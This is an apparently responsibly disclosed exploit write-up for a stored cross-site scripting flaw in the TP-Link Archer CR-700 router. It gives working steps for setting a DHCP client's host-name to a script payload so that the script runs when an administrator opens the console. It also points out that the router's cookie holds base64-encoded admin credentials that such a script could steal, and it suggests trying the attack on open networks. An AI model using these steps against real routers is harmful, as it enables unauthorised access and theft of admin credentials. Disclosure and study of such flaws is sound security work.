@@ -1,0 +1,44 @@
+# Exploit Title: TP-Link Archer CR-700 XSS vulnerability
+# Google Dork: N/A
+# Date: 09/07/2016
+# Exploit Author: Ayushman Dutta
+# Vendor Homepage: http://www.tp-link.us/
+# Software Link: N/A
+# Version: 1.0.6 (REQUIRED)
+# Tested on: Linux
+# CVE : N/A
+#Exploit Information:
+https://github.com/ayushman4/TP-Link-Archer-CR-700-XSS-Exploit/blob/master/README.md
+
+TP-Link-Archer-CR-700-XSS-Exploit
+
+Exploiting TP-Link Archer CR-700 Router. (Responsibly Disclosed to TP-Link)
+
+Step 1-> On you linux machine (Kali or Ubuntu) type the following command
+
+gedit /etc/dhcp/dhclient.conf
+
+Comment out the line below
+send host-name = gethostname();
+
+Copy it to the line below it and change the gethostname() function to an XSS script like below.
+
+send host-name = "<script>alert(5)</script>";
+
+Step 2:Restart your linux system so that the changes takes into effect.
+
+Step 3: Send a DHCP request to the router to receive an IP address with the command below.(Try this on any open network routers which is using TP-Link Archer CR-700)
+
+dhclient -v -i wlan0
+
+On running the command above, it send a DHCP request to the router. On a DHCP request, the host name is sent to which we have forcibly set it to an XSS script <script>alert(5)</script>
+
+Step 4: Login to the administrator console.
+
+On logging in the Script executes.
+
+One more issue that I saw in the router that was that there was no CSRF token. The cookie set by the router contains a base64 encoded username & password whcih can be stolen using an XSS script.
+
+Note:All The above information has been disclosed to TP-Link, who have reporduced the problem and passed it to their R&D team to fix the issue.
+
+A URL to the product https://www.amazon.com/Wireless-Certified-Cablevision-Archer-CR700/dp/B012I96J3W
